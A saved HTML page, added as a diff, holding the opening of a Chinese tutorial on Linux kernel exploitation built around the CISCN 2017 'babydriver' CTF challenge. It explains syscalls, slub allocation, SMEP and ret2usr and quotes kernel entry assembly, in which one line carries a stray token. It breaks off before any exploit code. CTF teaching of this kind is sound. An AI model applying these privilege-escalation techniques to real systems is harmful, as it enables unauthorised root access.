@@ -1,0 +1,1230 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+    <meta name="viewport"
+          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
+    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
+    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
+    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
+    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
+    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
+    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
+    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
+    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>
+
+        <title>【技术分享】一道简单内核题入门内核利用 - 安全客 - 有思想的安全新媒体</title>
+    
+        <meta name="keywords" content="内核利用"/>
+    
+        <meta name="description" content="对于学过用户空间pwn的同学来说，内核一直是向往但是却不知道如何下手的一个地方，最近的CISCN比赛中出现了一道内核的基础题目，我认为是一道非常适合内核入门的一道题目，所以我就这道题目，通过自己的分析，希望让大家学会如何去分析一道内核的题目，如何去完成内核的题目，如何通过阅读linux内核源码在内核漏洞利用中帮助自己理解细节，学会分析。"/>
+        <meta property="wb:webmaster" content="224437c7be31d633"/>
+
+    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
+    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
+    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
+    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
+    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
+    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
+    (max-device-width:900px), only screen and (max-width:900px)" />
+    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
+    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
+    <script type="text/javascript" src="/js/iscroll.js"></script>
+    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
+    <script type="text/javascript">
+        var myScroll, myNavScroll;
+
+        function iscrollLoaded() {
+            myScroll = new IScroll('#wrapper',
+                {
+                    scrollX: true,
+                    scrollY: false,
+                    bounceEasing: 'circular',
+                    eventPassthrough: true,
+                    preventDefault: false,
+                    bounceTime: 500
+                }
+            );
+        }
+
+        $(function () {
+
+            //导航横向滚动
+
+
+            function setNavWidth() {
+
+                /* 计算导航宽度 */
+                var allWidth = $(window).width();
+                var scroller = $('#scroller');
+
+                if (allWidth > 900) {
+                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
+                    scroller.css('overflow', 'visible');
+                    if (myNavScroll) myNavScroll.destroy();
+                } else {
+
+                    var width = 0;
+                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
+                        if (!$(this).hasClass('mobile-hide')) {
+                            width += $(this).outerWidth();
+                        }
+                    });
+                    scroller.find('ul').add(scroller.find('.scroll')).width(width);
+
+                    if (myNavScroll) myNavScroll.destroy();
+
+                    myNavScroll = new IScroll('#scroller', {
+                        scrollX: true,
+                        scrollY: false,
+                        momentum: false,
+                        click: true
+                    });
+
+                }
+
+            }
+
+            setNavWidth();
+            $(window).resize(function (event) {
+                setNavWidth();
+            });
+
+        });
+
+    </script>
+</head>
+<body onload="iscrollLoaded();">
+<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
+    <img src=""/>
+</div>
+
+<div id="is-mobile"></div>
+<div class="container">
+        <div class="mobile-header">
+        <div class="header clearfix">
+            <div class="header-wrapper clearfix">
+                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
+                                <form id="search" class="search-box" action="/search/index" method="GET">
+                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
+                    <input class="icon" type="submit" value="">
+                    <input type="hidden" name="type" value=""/>
+                </form>
+                <div class="bug">
+                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
+                    <ul class="typelist">
+                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
+                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
+                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
+                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
+                    </ul>
+                </div>
+                                <div class="logNreg mobile-hide">
+                    <div class="unlog">
+                        <i></i>
+                        <a href="log.html" class="log">登录</a>
+                        <span>|</span>
+                        <a href="reg.html" class="reg">注册</a>
+                    </div>
+                    <div class="loged">
+                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
+                        <div class="user-links">
+                            <span class="arrow"></span>
+                            <ul>
+                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
+                                                               target="_blank"><i></i><span>账号设置</span></a></li>
+                                <li class="alert-setting"><a href="/keywords/index"
+                                                             target="_blank"><i></i><span>告警设置</span></a></li>
+                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
+                                </li>
+                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
+                                </li>
+                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
+                                </li>
+                                <li class="my-exit"><a
+                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
+                                </li>
+                            </ul>
+                        </div>
+
+                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
+                        <div class="message-links">
+                            <span class="arrow"></span>
+                            <ul>
+                                <li class="account-setting" style="display:none;"><a href="/myres/index"
+                                                                                     target="_blank"><i></i><span>回复我的</span></a>
+                                </li>
+                                <li class="my-bug"><a href="/myvul/index"
+                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
+                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
+                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
+                                </li>-->
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <style type="text/css">
+            .nav {
+                overflow: hidden;
+            }
+
+            .nav .scroll {
+                width: auto;
+            }
+        </style>
+        <div id="wrapper">
+            <div id="scroller" class="nav">
+                <div class="scroll">
+                    <ul class="nav-list">
+                        <li ><a class="link-nav"
+                                                                                 href="/index/index">首页</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/vul/index">漏洞</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/introduce/list">招聘</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
+                        <ul class="subnav-list mobile-hide">
+                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
+                        </ul>
+			-->
+                        </li>
+                        <li class="cur">
+                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
+                        <ul class="subnav-list mobile-hide">
+                            <li><a class="link-subnav" href="/course/index">学院</a></li>
+                        </ul>
+                        </li>
+                        <li ><a class="link-nav"
+                                                               href="/activity/index">活动</a></li>
+                        <li class="mobile-hide "><a class="link-nav"
+                                                                                                   href="/ctf/index">CTF训练营</a>
+                        </li>
+                        <li ><a class="link-nav"
+                                                               href="/interref/list">安全内参</a></li>
+                        <li ><a class="link-nav" href="/app/index">APP</a></li>
+
+                        <!--<li ><a href="/course/index">学院</a></li>-->
+                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
+                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="mobile-content">
+        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
+<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
+<style>
+    p .syntaxhighlighter {
+        width: 80%;
+    }
+</style>
+
+<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>
+
+<div class="content clearfix">
+    <div class="main">
+        <div class="article">
+            <div id="article_box">
+                <h2>【技术分享】一道简单内核题入门内核利用</h2>
+                <div class="article-msg">
+                    <span class="time">2017-07-26 11:13:49</span>
+                    
+                                        <span class="read">阅读：15198次</span>
+                    <span><a style="display: none;" class="good" href="javascript:;"
+                             data-target="/learning/good" data-value="g_4148"
+                             data-type="learning">点赞(0)</a></span>
+                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
+                             data-pk="4148" data-type="learning">收藏</a></span>
+                                        <span><a style="margin-left: 4px;" class="fav" href=""
+                             target="_blank">来源： 安全客</a></span>
+                    
+                    
+                    <div style="margin-top:10px; ">
+                        <a href="/member/contribute?uid=2806750221" style="color:#848e99;">
+                            <img src="http://p1.qhmsg.com/dm/150_150_100/t00df551a583a87f4e9.jpg" data-is-avatar="true"
+                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
+                        </a>
+
+                    </div>
+                    <span class="orig">作者：<a href="/member/contribute?uid=2806750221" style="color:#848e99;">anciety</a></span>
+                                    </div>
+                <hr size="1">
+                <div class="article-msg">
+                    <p><!-- JiaThis Button BEGIN -->
+
+<!--
+<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
+	<a class="jiathis_button_weixin"></a>
+	<a class="jiathis_button_tsina"></a>
+    <a class="jiathis_button_tqq"></a>
+    <a class="jiathis_button_qzone"></a>
+    <a class="jiathis_button_renren"></a>
+    <a class="jiathis_button_xiaoyou"></a>
+    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+</span>
+
+-->
+</p>
+                </div>
+                <p><p style="text-align: center; text-indent: 0em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><img src="http://p1.qhimg.com/t01392a71ce63e95255.jpg" title="t01a9f2a6d5a4135b07.jpg" alt="http://p1.qhimg.com/t01a9f2a6d5a4135b07.jpg"/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; word-break: break-all; text-indent: 32px; background: white;"><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, sans-serif; font-size: 18px; font-weight: 900;">作者：<a href="http://bobao.360.cn/member/contribute?uid=2806750221" target="_self" style="color: rgb(0, 112, 192); text-decoration: underline;"><span style="font-family: 微软雅黑, sans-serif; font-size: 18px; font-weight: 900; color: rgb(0, 112, 192);">anciety</span></a></span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; text-indent: 32px; background: white;"><span style="font-weight: 900; font-size: 18px; font-family: 微软雅黑, sans-serif; color: rgb(0, 112, 192);">预估稿费：400 RMB</span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; text-indent: 32px; background: white;"><span style="font-weight: 900; font-size: 18px; color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">前言</span></strong></span><br/></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">对于学过用户空间pwn的同学来说，内核一直是向往但是却不知道如何下手的一个地方，最近的CISCN比赛中出现了一道内核的基础题目，我认为是一道非常适合内核入门的一道题目，所以我就这道题目，通过自己的分析，希望让大家学会如何去分析一道内核的题目，如何去完成内核的题目，如何通过阅读linux内核源码在内核漏洞利用中帮助自己理解细节，学会分析。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">调试环境</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">内核的知识很多，我没有办法将所有知识都阐述详细，我在这里默认大家已经知道了以下内容的基本概念：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">内核</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">特权等级</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">内核空间与用户空间</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">系统调用</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">slab/slub分配器</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">内核模块/驱动</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这些都是内核的基础知识，我在这里不做详细的阐述，大家可以自己去找找资料，我在这里主要将这些基础概念给大家一个直观的印象。</span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1.	内核</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">内核是操作系统的核心，目的是为上层提供一个接口，和CPU进行交互，方式就是通过设置各种CPU所需要的结构，让CPU能够提供相应的功能，比如设置虚拟内存所需要的一些结构，使得CPU能够顺利识别，从而提供虚拟内存功能。和操作系统进行交互可以通过系统调用等方式实现。</span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2.	特权等级</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">CPU将指令分为各种特权等级，特权指令就是必须在特定特权下才能够执行的指令，否则会出现错误，intel将特权等级分为ring0到ring3，其中ring3特权最低，ring0最高，linux只使用了ring0和ring3，ring0为内核运行的等级，ring3为用户运行的等级。</span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">3.	内核空间与用户空间</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">内核空间就是操作系统自己运行的空间，运行在ring0特权等级，拥有自己的空间，位于内存的高地址，而用户空间则是我们平时应用程序运行的空间，运行在ring3特权等级，使用较低地址。内核拥有自己的栈，和用户空间的栈并不共用。</span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">4.	系统调用</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">系统调用是linux内核向用户空间提供功能的方式，通过调用特定的系统调用，用户空间可以获取内核提供的功能。比如read函数事实上就是一个系统调用，通过传入特定的参数，内核可以读取用户输入，并且输入到buf里。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">通过使用系统调用，用户空间用户程序将会转入内核空间去执行，在执行完之后通过特殊方式回到用户空间，中间会涉及到用户空间与内核空间的切换。大致流程如下：</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1)	进入</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">i.	通过swapgs切换GS段寄存器，是将GS寄存器值和一个特定位置的值进行交换，目的是保存GS值，同时将该位置的值作为内核执行时的GS值使用。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">ii.	将当前栈顶（用户空间栈顶）记录在CPU独占变量区域里，将CPU独占区域里记录的内核栈顶放入rsp(esp)。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">iii.	通过push保存各寄存器值，代码如下：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><a href="http://elixir.free-electrons.com/linux/v4.12/source/arch/x86/entry/entry_64.S">http://elixir.free-electrons.com/linux/v4.12/source/arch/x86/entry/entry_64.S</a>&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">1.&nbsp;&nbsp;ENTRY(entry_SYSCALL_64)
+2.&nbsp;&nbsp;/*&nbsp;SWAPGS_UNSAFE_STACK是一个宏，x86直接定义为swapgs指令&nbsp;*/
+3.&nbsp;&nbsp;SWAPGS_UNSAFE_STACK
+4.&nbsp;
+5.&nbsp;&nbsp;/*&nbsp;保存栈值，并设置内核栈&nbsp;*/
+6.&nbsp;&nbsp;movq&nbsp;%rsp,&nbsp;PER_CPU_VAR(rsp_scratch)
+7.&nbsp;&nbsp;movq&nbsp;PER_CPU_VAR(cpu_current_top_of_stack),&nbsp;%rsp
+8.&nbsp;
+9.&nbsp;
+10./*&nbsp;通过push保存寄存器值，形成一个pt_regs结构&nbsp;*/
+11./*&nbsp;Construct&nbsp;struct&nbsp;pt_regs&nbsp;on&nbsp;stack&nbsp;*/
+12.pushq&nbsp;&nbsp;$__USER_DS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;pt_regs-&gt;ss&nbsp;*/
+13.pushq&nbsp;&nbsp;PER_CPU_VAR(rsp_scratch)&nbsp;&nbsp;/*&nbsp;pt_regs-&gt;sp&nbsp;*/
+14.pushq&nbsp;&nbsp;%r11&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;pt_regs-&gt;flags&nbsp;*/
+15.pushq&nbsp;&nbsp;$__USER_CS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;pt_regs-&gt;cs&nbsp;*/
+16.pushq&nbsp;&nbsp;%rcx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;pt_regs-&gt;ip&nbsp;*/
+17.pushq&nbsp;&nbsp;%rax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;pt_regs-&gt;orig_ax&nbsp;*/
+18.pushq&nbsp;&nbsp;%rdi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;pt_regs-&gt;di&nbsp;*/
+19.pushq&nbsp;&nbsp;%rsi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;pt_regs-&gt;si&nbsp;*/
+20.pushq&nbsp;&nbsp;%rdx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;pt_regs-&gt;dx&nbsp;*/
+21.pushq&nbsp;&nbsp;%rcx&nbsp;tuichu&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;pt_regs-&gt;cx&nbsp;*/
+22.pushq&nbsp;&nbsp;$-ENOSYS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;pt_regs-&gt;ax&nbsp;*/
+23.pushq&nbsp;&nbsp;%r8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;pt_regs-&gt;r8&nbsp;*/
+24.pushq&nbsp;&nbsp;%r9&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;pt_regs-&gt;r9&nbsp;*/
+25.pushq&nbsp;&nbsp;%r10&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;pt_regs-&gt;r10&nbsp;*/
+26.pushq&nbsp;&nbsp;%r11&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;pt_regs-&gt;r11&nbsp;*/
+27.sub&nbsp;$(6*8),&nbsp;%rsp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;pt_regs-&gt;bp,&nbsp;bx,&nbsp;r12-15&nbsp;not&nbsp;saved&nbsp;*/</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">iv.	通过汇编指令判断是否是x32_abi（暂时可以忽略这个内容）。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">v.	通过系统调用号，跳到全局变量sys_call_table相应位置继续执行相应系统调用。</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2)	退出</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">i.	通过swapgs恢复GS值。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">ii.	通过sysretq或者iretq恢复到用户空间进行执行，如果使用Iretq还需要给出用户空间的一些信息，比如CS值，eflags标志寄存器值，用户栈顶位置等等信息。</span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">5.	slab/slub分配器</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这是一个比较大的内容，内核中也需要使用到内存的分配，类似于用户空间malloc的功能。在内核中没有libc，所以没有malloc，但是需要这样的功能，所以有kmalloc，其实现是使用的slab/slub分配器，现在多见的是slub分配器。这个分配器通过一个多级的结构进行管理。首先有cache层，cache是一个结构，里边通过保存空对象，部分使用的对象和完全使用了对象来管理，对象就是指内存对象，也就是用来分配或者已经分配的一部分内核空间。kmalloc使用了多个cache，一个cache对应一个2的幂大小的一组内存对象。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">slab分配器严格按照cache去区分，不同cache的无法分配在一页内，slub分配器则较为宽松，不同cache如果分配相同大小，可能会在一页内，这个点很重要，之后的exp会用到。</span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">6.	内核模块/驱动</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这是linux拓展内核功能的一个功能，通过向内核插入内核模块可以动态的加载一些驱动代码，用来负责和硬件进行交互，或者在内核层提供一些软件功能。内核模块运行在内核空间，可以通过设备文件来进行交互，比如/dev/目录下的文件很多就是设备文件，打开设备文件，关闭设备文件等等就是使用open、close函数，这些函数在内核模块里进行定义，然后在加载的时候按照一定的规则进行设置，所以通过这些函数可以调用到内核里的模块的相应设置好的函数，最后在内核完成一系列操作，为用户空间提供功能。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">SMEP是我需要稍微提一下的，这是一个内核的保护机制，目的是避免ret2usr利用方式，ret2usr即从内核空间劫持控制流，使得控制流回到用户空间，以ring 0执行用户空间代码来进行提权。开启了SMEP的时候，CPU将会阻止在ring 0执行用户空间代码。这是一个CPU功能，由CPU的CR4寄存器管理，用一个位来标志是否开启SMEP保护。不过，SMEP保护并没有阻止直接从用户空间获取数据，只是阻止执行用户空间代码。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">题目</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">好了基础基本就提到这里，让我们来看一道题，这道题是ciscn-2017的babydriver，题目难度不大，很适合入门，让我们可以很直观的感受到完成一次内核pwn的整个过程。</span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1.	题目分析</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">题目给出了3个文件，一个rootfs.cpio一个bzImage和一个boot.sh，boot.sh内容如下：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">1.#!/bin/bash
+2.
+3.qemu-system-x86_64&nbsp;-initrd&nbsp;rootfs.cpio&nbsp;-kernel&nbsp;bzImage&nbsp;-append&nbsp;&#39;console=ttyS0&nbsp;root=/dev/ram&nbsp;oops=panic&nbsp;panic=1&#39;&nbsp;-enable-kvm&nbsp;-monitor&nbsp;/dev/null&nbsp;-m&nbsp;64M&nbsp;--nographic&nbsp;-smp&nbsp;cores=1,threads=1&nbsp;-cpu&nbsp;kvm64,+smep</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">很显然我们需要安装qemu，这个就自己去安装啦。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">然后就是一个对qemu的调用，kernel使用了bzImage，然后用rootfs.cpio作为initrd，其实就是bzImage是内核的映像，然后rootfs.cpio是根文件的映像。在远程，也就是使用这个boot.sh打开的qemu环境，我们能接触到的就是在这个qemu环境里。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">qemu环境里有flag，可是我们没有权限读取，必须是root才有权限读取，显然我们需要进行提权。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">通过查看/lib/modules/目录，我们发现有一个babydriver.ko，通过查看/proc/modules我们可以看到babydriver.ko作为内核模块已经加载进了内核里，我们还可以看到其加载的地址，很好！</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">接下来的任务就很显然了，我们需要看懂babydriver.ko干了什么。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">init和exit函数没有什么太大的意思，基本上就是设置参数，初始化设备等等工作，我们的重点是几个函数。不过需要注意，init中设置了/dev/babydev作为设备文件。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">open函数：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre 